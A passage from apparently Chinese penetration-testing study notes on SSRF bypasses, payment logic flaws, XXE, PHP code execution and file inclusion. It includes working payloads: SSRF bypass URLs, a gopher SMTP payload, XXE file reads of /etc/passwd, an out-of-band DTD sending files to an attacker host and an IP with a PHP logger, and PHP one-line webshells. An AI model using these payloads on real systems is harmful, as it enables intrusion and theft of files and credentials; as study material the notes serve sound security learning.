title=\"可能出现的地方\"></a>可能出现的地方</h2><ol>\n<li>社交分享功能：获取超链接的标题等内容进行显示；</li>\n<li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览；</li>\n<li>在线翻译：给网址翻译对应网页的内容；</li>\n<li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片；</li>\n<li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用户体验；</li>\n<li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以结果可以捕获相应的信息，就可以进行ssrf测试；</li>\n<li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作；</li>\n<li>数据库内置功能：数据库的比如mongodb的copyDatabase函数；</li>\n<li>邮件系统：比如接收邮件服务器地址；</li>\n<li>编码处理，属性信息处理，文件处理：</li>\n<li>未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞；一些url中的关键字：share、wap、url、link、src、source、target、u、1g、display、sourceURL、imageURL、doamin…</li>\n<li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li>\n</ol>\n<h2 id=\"危害：\"><a href=\"#危害：\" class=\"headerlink\" title=\"危害：\"></a>危害：</h2><p>第一种危害：我们可以通过http访问到一些未开发完的网站；</p>\n<p>第二种危害：SSRF不只有支持HTTP协议，通过<strong>file协议</strong>可以获取到php的源码，能够读取是很有用的，因为一些配置文件很有可能得到数据库的账号密码，不只有file协议；<strong>dict协议（字典协议）</strong>：查询开放的端口，例：dict://127.0.0.1:14147</p>\n<h2 id=\"利用方式（SSRF能做什么）：\"><a href=\"#利用方式（SSRF能做什么）：\" class=\"headerlink\" title=\"利用方式（SSRF能做什么）：\"></a>利用方式（SSRF能做什么）：</h2><ol>\n<li>让服务端去访问对应的网址；</li>\n<li>让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms；</li>\n<li>可以使用file、dict、gopher、ftp协议进行请求访问相应的文件；</li>\n<li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包（palyload））；</li>\n<li>攻击内网应用程序（利用跨协议通信技术）；</li>\n<li>判断内网主机是否存活：方法是访问看是否有端口开放；</li>\n<li>DOS攻击（请求大文件，之中保持连接keep_aline always）</li>\n</ol>\n<h2 id=\"漏洞实例：\"><a href=\"#漏洞实例：\" class=\"headerlink\" title=\"漏洞实例：\"></a>漏洞实例：</h2><ol>\n<li>Wordpress3.5.1以下版本xmlrpc.php pingback的缺陷与ssrf；</li>\n<li>discuz!的ssrf（利用php的header函数来绕过，其实就是302跳转实现协议转换）；</li>\n<li>weblogic的ssrf。</li>\n</ol>\n<h2 id=\"防护SSRF：\"><a href=\"#防护SSRF：\" class=\"headerlink\" title=\"防护SSRF：\"></a>防护SSRF：</h2><ol>\n<li>禁止跳转；</li>\n<li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准；</li>\n<li>禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://，gopher://，ftp://等引起的问题；</li>\n<li>设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）；</li>\n<li>限制请求的端口为http常用的端口，比如80、443、8080、8090；</li>\n<li>同一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li>\n<li>通过正则匹配，不允许你传内网地址。</li>\n</ol>\n<h2 id=\"SSRF绕过：\"><a href=\"#SSRF绕过：\" class=\"headerlink\" title=\"SSRF绕过：\"></a>SSRF绕过：</h2><p>1、攻击本地</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1:80\nhttp:&#x2F;&#x2F;localhost:22</code></pre>\n\n<p>2、利用[::]</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">利用[::]绕过localhost\nhttp:&#x2F;&#x2F;[::]:80\t\t\t#等价于http:&#x2F;&#x2F;127.0.0.1:80</code></pre>\n\n<p>3、利用@</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;example.com@127.0.0.1</code></pre>\n\n<p>4、利用短地址</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;dwz.cn&#x2F;11SMa  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</code></pre>\n\n<p>5、利用特殊域名</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">利用的原理是DNS解析\nhttp:&#x2F;&#x2F;127.0.0.1.xip.io&#x2F;\nhttp:&#x2F;&#x2F;www.owasp.org.127.0.0.1.xip.io&#x2F;</code></pre>\n\n<p>6、利用DNS解析</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">在域名上设置A记录，指向127.0.0.1</code></pre>\n\n<p>7、利用Enclosed alphanumerics</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ \n⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ \n⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ \n⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ \nⒶ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ \nⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ \n⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ \n⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre>\n\n<p>8、利用句号</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></pre>\n\n<p>9、利用进制转换</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">可以是十六进制，八进制等。\n115.239.210.26  &gt;&gt;&gt;  16373751032\n首先把这四段数字给分别转成16进制，结果：73 ef d2 1a\n然后把 73efd21a 这十六进制一起转换成8进制\n记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x\n\nhttp:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;0177.0.0.1&#x2F;\nhttp:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;2130706433&#x2F;\nhttp:&#x2F;&#x2F;192.168.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235521&#x2F;\nhttp:&#x2F;&#x2F;192.168.1.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235777&#x2F;</code></pre>\n\n<p>10、利用特殊地址</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;0&#x2F;</code></pre>\n\n<p>11、利用协议</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Dict:&#x2F;&#x2F;\ndict:&#x2F;&#x2F;&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;d:&lt;word&gt;\nssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;\nSFTP:&#x2F;&#x2F;\nssrf.php?url&#x3D;sftp:&#x2F;&#x2F;example.com:11111&#x2F;\nTFTP:&#x2F;&#x2F;\nssrf.php?url&#x3D;tftp:&#x2F;&#x2F;example.com:12346&#x2F;TESTUDPPACKET\nLDAP:&#x2F;&#x2F;\nssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit\nGopher:&#x2F;&#x2F;\nssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25&#x2F;xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</code></pre>\n\n<p>12、使用组合</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">各种绕过进行自由组合</code></pre>\n\n<h1 id=\"九、支付漏洞\"><a href=\"#九、支付漏洞\" class=\"headerlink\" title=\"九、支付漏洞\"></a>九、支付漏洞</h1><h2 id=\"快捷支付原理：\"><a href=\"#快捷支付原理：\" class=\"headerlink\" title=\"快捷支付原理：\"></a>快捷支付原理：</h2><p>客户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知。</p>\n<ul>\n<li>浏览器跳转：（基本遇不到）</li>\n<li><ul>\n<li>基于用户访问的浏览器，如果用户在银行页面之父陈恭候，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。并且浏览器端数据很容易被篡改而降低安全性。</li>\n</ul>\n</li>\n<li>服务器端异步通知</li>\n<li><ul>\n<li>该方法是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST或GET的方式。商户网站接收异步参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额、订单信息是否与发起支付时一致，验证正常则对订单进行状态处理或为用户进行网站内入账等。</li>\n</ul>\n</li>\n</ul>\n<p>支付漏洞属于逻辑漏洞，不需要代码审计。</p>\n<h2 id=\"常见支付漏洞：\"><a href=\"#常见支付漏洞：\" class=\"headerlink\" title=\"常见支付漏洞：\"></a>常见支付漏洞：</h2><ol>\n<li>修改支付的价格；</li>\n<li>修改支付状态；</li>\n<li>修改订单数量；</li>\n<li>修改附属值：例如：优惠券；</li>\n<li>越权支付：支付扣钱为什么不能别人的；</li>\n<li>无限制试用。</li>\n</ol>\n<h2 id=\"如何挖掘支付漏洞：\"><a href=\"#如何挖掘支付漏洞：\" class=\"headerlink\" title=\"如何挖掘支付漏洞：\"></a>如何挖掘支付漏洞：</h2><ul>\n<li>找到关键的数据包：</li>\n<li><ul>\n<li>可能一个支付操作有三四个数据包，我们要对数据包进行挑选。</li>\n</ul>\n</li>\n<li>分析数据包：</li>\n<li><ul>\n<li>支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠），要尝试对数据包中的各个参数进行分析。</li>\n</ul>\n</li>\n<li>不按套路出牌：</li>\n<li><ul>\n<li>多去想想开发者没有想到的地方</li>\n</ul>\n</li>\n<li>PC端尝试过，wap（网页）端也看看，app也试试。</li>\n</ul>\n<h2 id=\"防御支付漏洞：\"><a href=\"#防御支付漏洞：\" class=\"headerlink\" title=\"防御支付漏洞：\"></a>防御支付漏洞：</h2><ul>\n<li>后端检查每一项值，包括支付状态。</li>\n<li>校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量。</li>\n<li>与第三方支付平台检查，实际支付的金额是否与订单金额一致。</li>\n<li>支付参数进行MD5加密、解密、数字签名及验证，这个可以有效地避免数据修改，重放攻击中的各种问题。</li>\n<li>金额超过阈值，进行人工审核。</li>\n</ul>\n<h1 id=\"十、XXE——实体注入\"><a href=\"#十、XXE——实体注入\" class=\"headerlink\" title=\"十、XXE——实体注入\"></a>十、XXE——实体注入</h1><p>productId=1&amp;storeId=1 ，当我们抓包分析数据时，有参数传递时，我们不仅要测是否存在sql注入，也可以看看是否有xxe。有时在前端是正常传数据，但是在服务器端就会将我们的参数值嵌入到了xml文档中进行解析，此时就有可能存在xxe漏洞。</p>\n<h2 id=\"什么是XML：\"><a href=\"#什么是XML：\" class=\"headerlink\" title=\"什么是XML：\"></a>什么是XML：</h2><ul>\n<li>XML指可扩展标记语言。</li>\n<li>XML是一种标记语言，很类似HTML。</li>\n<li>XML的设计宗旨是传输数据，而非显示数据。</li>\n<li>XML标签没有被预定义。您需要自行定义标签。</li>\n<li>XML被设计为具有自我描述性。</li>\n<li>XML是W3C的推荐标准。</li>\n</ul>\n<p>特点：</p>\n<ul>\n<li>XML仅仅是纯文本，他不会做任何事情。</li>\n<li>XML可以自己发明标签（允许定义自己的标签和文档结构）</li>\n</ul>\n<p><strong>总的来说XML就是个存储数据的东西。</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">存储数据流程：\n存一份模板——&gt;再存一堆东西\n模板怎么来：去加载某个文件，这个部分为DTD，这里可以获取访问加载xxxx，那么是不是可以获取本机文件呢</code></pre>\n\n<p><strong>XML一定会被后端代码所调用</strong></p>\n<h2 id=\"XXE是什么：\"><a href=\"#XXE是什么：\" class=\"headerlink\" title=\"XXE是什么：\"></a>XXE是什么：</h2><p>XXE：XML外部实体注入；<strong>用户输入的数据被当做xml代码执行</strong></p>\n<p>典型的攻击如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;\t\t\t#XML声明\n&lt;!DOCTYPE foo[\t\t\t\t\t\t\t\t\t\t#&#125;\n\t&lt;!ELEMENT foo ANY&gt;\t\t\t\t\t\t\t\t#&#125;\t这三行是DTD部分\n\t&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;\t\t#&#125;\n&lt;foo&gt;&amp;xee;&lt;&#x2F;foo&gt;\t\t\t\t\t\t\t\t\t#XML部分</code></pre>\n\n<p><strong>定义实体必须写在DTD部分</strong></p>\n<p>实体实际上就是变量</p>\n<h2 id=\"XXE原理：\"><a href=\"#XXE原理：\" class=\"headerlink\" title=\"XXE原理：\"></a>XXE原理：</h2><p>XXE是外部实体注入漏洞，应用程序解析xml输入 时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取，命令执行，内网端口扫描攻击内网网站等危害。</p>\n<p>php中存在一个叫做simplexml_load_string的函数，这个函数是将XML转化为对象，实例：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n    $test &#x3D; &#39;&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;1.txt&quot;&gt;]&gt;&lt;scan&gt;&amp;test;&lt;&#x2F;scan&gt;&#39;;\t#取1.txt存储在test实体中\n    $obj &#x3D; simplexml_load_string($test,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);\n    print_r($obj);\n?&gt;</code></pre>\n\n<p>变量test里面是XML，然后使用simplexml_load_string将其转化为对象，第一个参数是xml语句，SimpleXMLElement是调用了SimpleXMLElement这个类，然后LIBXML_NOENT是替代实体，然后他去执行了file协议去读取我的文件。</p>\n<p>有了XML实体，关键字’SYSTEM’会令XML解析器从URL中读取内用，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）</p>\n<p>读取文件，路径怎么判断：</p>\n<ul>\n<li>强行猜解；</li>\n<li>传特殊参数想办法报错</li>\n<li>找报错的页面找到泄露的路径</li>\n</ul>\n<p>外部文档声明：</p>\n<p>假如DTD位于XML源文件的外部，那么它应通过下面的语法被封装在一个DOCTYPE定义中：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></pre>\n\n\n\n<h2 id=\"漏洞危害：\"><a href=\"#漏洞危害：\" class=\"headerlink\" title=\"漏洞危害：\"></a>漏洞危害：</h2><ul>\n<li>读取敏感文件</li>\n<li>执行ssrf漏洞，进行内网端口探测，攻击内网网站等。</li>\n</ul>\n<h3 id=\"XXE-扩展\"><a href=\"#XXE-扩展\" class=\"headerlink\" title=\"XXE-扩展\"></a>XXE-扩展</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</code></pre>\n\n<p>外部应用可扩展http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">libxml2：file、http、ftp\n\nPHP：file、http、ftp、php、compress.zlib、compress.bzip2、data、glob、phar\n\nJava：http、https、ftp、file、jar、netdoc、mailto、gopher *\n\n.NET：file、http、https、ftp</code></pre>\n\n<p>SSRF和XXE最大的功能就是发送请求。</p>\n<p>XXE也存在不给你显示（输出）的情况（类似于盲注），解决方法：</p>\n<ul>\n<li>利用其他东西证明其存在</li>\n<li>将想要的数据外带出来，如DNS注入、反弹注入</li>\n</ul>\n<p>我们可以使用一个类似于接收平台一样的接收器，XML读取数据然后发送到接受的平台，然后接收平台存储，我们再去接收平台查看就可以了。</p>\n<p>我们先读取我们想要的文件，然后为了传输方便，我们先来个base64编码，我们可以使用php伪协议读取文件base64编码（仅PHP支持）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;c:&#x2F;1.txt\n\n然后我们再去调用一个外部xml比如1.xml（&lt;!ENTITY % remote SYSTEm &quot;http:&#x2F;&#x2F;192.168.19.131&#x2F;1.xml&quot;&gt;）\n&lt;!ENTITY % all\n&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;120.203.13.75:8123&#x2F;xxe&#x2F;2.php?id&#x3D;%file;&#39;&gt;&quot;\n&gt;\n%all;\n\n这个1.xml会被加载到原本的xml，然后我们最后来调用，然后你读取出来的文件会用get传参的方式传参给2.php，然后2.php记录下存储到3.txt中\n&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&quot;id&quot;],FILE_APPEND);?&gt;</code></pre>\n\n<p>我们可以通过获取别人访问我这个文件传的参数，然后将这个参数储存下来，来做到获取别人数据的方法，所以我们需要一个炮台（公网IP）来让别人访问的到。</p>\n<p>除了纯静态网站，大部分往回走哪都会跟数据库交互的，那么肯定有一个文件内有数据库的账号，密码，一般会有一个配置文件会存着IE东西，访问一个文件很有可能会是空白，但是是存在的。</p>\n<p><strong>做渗透测试现在本地浮现成功了再去线上做，因为线上可能会有动静而被发现。</strong></p>\n<h2 id=\"漏洞检测：\"><a href=\"#漏洞检测：\" class=\"headerlink\" title=\"漏洞检测：\"></a>漏洞检测：</h2><ol>\n<li>XInclude攻击</li>\n</ol>\n<p>一些应用程序接收用户的数据，在服务端嵌入到xml文档中解析。</p>\n<p>这是我们无法控制整个xml文档，所以就无法定义或修改DOCTYPE元素。XInclude是xml规范的一部分，允许从子文档中构建xml文档，从而进行攻击。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">直接将参数改为以下面的值：\n&lt;foo xmlns:xi&#x3D;&quot;htttp:&#x2F;&#x2F;www&#x2F;.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt;\n&lt;xi:include parse&#x3D;&quot;text&quot; href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&#x2F;&gt;&lt;&#x2F;foo&gt;</code></pre>\n\n<p>原本的参数值就是productId=1，我们怎么能知道在服务端嵌入到了xml文档中解析。所以，遇到这种参数，我们除了试一下sql注入，还能试试是否存在xxe。</p>\n<ol start=\"2\">\n<li>利用文件上传来进行xxe攻击</li>\n</ol>\n<p>docx和svg等都是基于xml格式，如果图像处理库支持SVG图像，攻击者可以提交恶意的SVG图像，就可以利用文经上传执行xxe攻击。</p>\n<p>创建具有xml代码的SVG图像：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?xml version&#x3D;&quot;1.0&quot; standalone&#x3D;&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hostname&quot; &gt; ]&gt;&lt;svg width&#x3D;&quot;128px&quot; height&#x3D;&quot;128px&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; version&#x3D;&quot;1.1&quot;&gt;&lt;text font-size&#x3D;&quot;16&quot; x&#x3D;&quot;0&quot; y&#x3D;&quot;16&quot;&gt;&amp;xxe;&lt;&#x2F;text&gt;&lt;&#x2F;svg&gt;</code></pre>\n\n<p>将此图像上传上去，就可以在头像上看到/etc/hostname文件的内容。</p>\n<ol start=\"3\">\n<li>通过修改请求包的文件内用类型来进行xxe攻击</li>\n</ol>\n<p>有些应用程序会允许xml的内容类型，我们就可以修改Content-Type：text/xml字段，来利用xxe漏洞。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">POST &#x2F;action HTTP&#x2F;1.0\nContent-Type: text&#x2F;xml\nContent-Length: 52\n\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;&#x2F;foo&gt;\n\n#原来的请求体中的内容是：foo&#x3D;bar</code></pre>\n\n<ol start=\"4\">\n<li>读取敏感文件</li>\n</ol>\n<p>利用file协议读取服务器中的敏感文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;\n#在参数位置输入&amp;xxe;就行。\n&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;&#x2F;productId&gt;&lt;&#x2F;stockCheck&gt;</code></pre>\n\n<ol start=\"5\">\n<li>执行ssrf攻击</li>\n</ol>\n<p>利用http协议，让存在xxe漏洞的应用程序向与它处于同意内网的发送http请求。</p>\n<p>也可利用其他协议，例如：ftp，data，等。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;192.168.1.1:3389&quot;&gt;]&gt;</code></pre>\n\n<ol start=\"6\">\n<li>带外通道技术来进行盲注xxe</li>\n</ol>\n<p>一般情况下，虽然存在xxe漏洞，但是不会回显外部实体注入的值，我们就要利用带外通道技术。（OOB）</p>\n<p>攻击者在vps中防止恶意的DTD，让存在漏洞的应用程序去访问。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">恶意DTD（外部实体）内容，访问http:&#x2F;&#x2F;web-attacker.com&#x2F;malicious.dtd可以访问到该DTD\n&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;\n&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;wdb-attacker.com&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;\n%eval;\n%exfiltrate;</code></pre>\n\n<p>向存在漏洞的应用程序中输入：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;web-attacker.com&#x2F;malicious.dtd&quot;&gt; %xxe;]&gt;</code></pre>\n\n<ol start=\"7\">\n<li>通过错误消息读取文件从而利用盲注xxe。</li>\n</ol>\n<p>通过触发xml解析错误，在解析错误消息中返回我们需要读取的敏感消息。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;\n&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEm &#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%fiel;&#39;&gt;&quot;&gt;\n%eval;\n%error;</code></pre>\n\n<h2 id=\"漏洞防御\"><a href=\"#漏洞防御\" class=\"headerlink\" title=\"漏洞防御\"></a>漏洞防御</h2><ul>\n<li>使用开发语言提供的禁用外部实体的方法。</li>\n<li>过滤用户输入的xml数据中的关键字。</li>\n<li>不允许xml中you用户自定义的文档类型。</li>\n</ul>\n<h1 id=\"十一、代码执行漏洞\"><a href=\"#十一、代码执行漏洞\" class=\"headerlink\" title=\"十一、代码执行漏洞\"></a>十一、代码执行漏洞</h1><p>漏洞原理：用户输入的数据被当做后端代码执行</p>\n<p>RCE（remote command/code execute）远程命令或者代码执行。现在因为RCE这个词的滥用，RCE的范围比较广，只要渗透的最终情况可以实现执行命令或者是代码都属于RCE，例如代码执行、文件包含、反序列化、命令执行，甚至是写文件getshell都可以属于RCE。</p>\n<h2 id=\"造成代码执行的函数\"><a href=\"#造成代码执行的函数\" class=\"headerlink\" title=\"造成代码执行的函数\"></a>造成代码执行的函数</h2><p>这里将要执行的代码写成$a</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1、eval($a);\t\t\t#eval是代码执行用得最多的，他可以多行执行\n\teval($_REQUEST[&#39;a&#39;]);\n\t\n2、assert($a);\t\t#只能单行执行\n\tassert($_REQUEST[&#39;a&#39;])\t\t#想要使用assert进行多行执行，就要进行写文件然后执行，例如：\n\tfile_put_contents(&#39;1.php&#39;,&#39;&lt;?php var_dump(8);phpinfo();?&gt;&#39;)\n\t\n3、preg_replace()\t#正则替换函数\n\t&lt;?php preg_replace(&#39;&#x2F;a&#x2F;e&#39;,&#39;$_GET&#39;,&#39;abc&#39;);\t\t#当出现&#x2F;e的修饰符，就会存在代码执行，其中，abc中的a必须存在才会发生替换，函数也才会触发。\n\t\n4、create_function()\t#匿名函数\n\t$a &#x3D; create_function(&#39;$id&#39;,&#39;echo $id;&#39;);\t\t#自定义函数$a\n\techo $a(8);\t\t\t\t\t\t\t\t\t\t#执行echo $id；；因为$id我传参是8所以echo $id；\n\n5、array_map()\t\t#回调函数，调用某个函数。\n\t\t一句话木马：\n\t\tarray_map(&#39;assert&#39;,array($_POST[&#39;c&#39;]));\n\t\t\n\t\tarray_map($REQUEST[&#39;b&#39;],array());\n\t\t请记住：eval是无法调用的，因为eval比较特殊，不认为是函数，属于特殊写法。\n\t\tcall_user_func()\t也可回调，回调函数在PHP有很多\n\t\t\n6、特殊组合（双引号二次解析）\n\tPHP版本5.5及其以上版本可以使用\n\t&quot;$&#123;phpinfo()&#125;&quot;;\t\t&#x3D;&gt;执行代码phpinfor()\n\t\n\tPHP的字符串是可以使用复杂的表达式。例如$&#123;中间可以写调用的函数&#125;\n\t$&#123;phpinfo()&#125;;\t\t&#x2F;&#x2F;可以执行\n\t$a $&#123;phpinfo()&#125;;\t&#x2F;&#x2F;可以执行</code></pre>\n\n<p>安装CMS时写入{$_REQUEST[8]}就会被写入配置文件：</p>\n<ol>\n<li><p>怎么样进入CMS安装页面：</p>\n<p>往回走哪的提示：安装过的CMS它有锁    install.lock这样的文件，我们只要删除或者更名这个install.lock即可重新安装此CMS</p>\n</li>\n<li><p>安装究竟做了什么？</p>\n</li>\n</ol>\n<p>①：检测你的黄静是否符合条件；</p>\n<p>②：把数据库信息写入配置文件；</p>\n<p>③：连接数据库，写入数据。</p>\n<p>如何删除锁：</p>\n<p>unlink()：删除文件函数。但是删锁的操作需要代码审计。</p>\n<h1 id=\"十二、本地包含与远程包含\"><a href=\"#十二、本地包含与远程包含\" class=\"headerlink\" title=\"十二、本地包含与远程包含\"></a>十二、本地包含与远程包含</h1><h2 id=\"什么是文件包含漏洞？\"><a href=\"#什么是文件包含漏洞？\" class=\"headerlink\" title=\"什么是文件包含漏洞？\"></a>什么是文件包含漏洞？</h2><p>攻击者利用包含的特性，加上应用本身对文件（包含）控制不严格，最终造成攻击者进行任意文件包含。（注：包含的文件会被当做脚本文件来执行）。</p>\n<p>一句话来说就是：文件包含并不属于漏洞，但是，由于对包含进来的文件不可控，导致了文件包含漏洞的产生。</p>\n<p>注：包含文件很有用，可以简化代码，文件包含就是为了重复使用相同的代码。</p>\n<p>文件包含分为<strong>本地文件包含LFI</strong>和<strong>远程文件包含RFI</strong>（需要allow_url_include = On）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">本地文件包含LFI：包含服务器上的资源，比如你上传的马；\n远程文件包含RFI：通过http协议包含其他地方的资源。</code></pre>\n\n<p>利用场景：</p>\n<pre class=\"line-numbers language-none\"><code 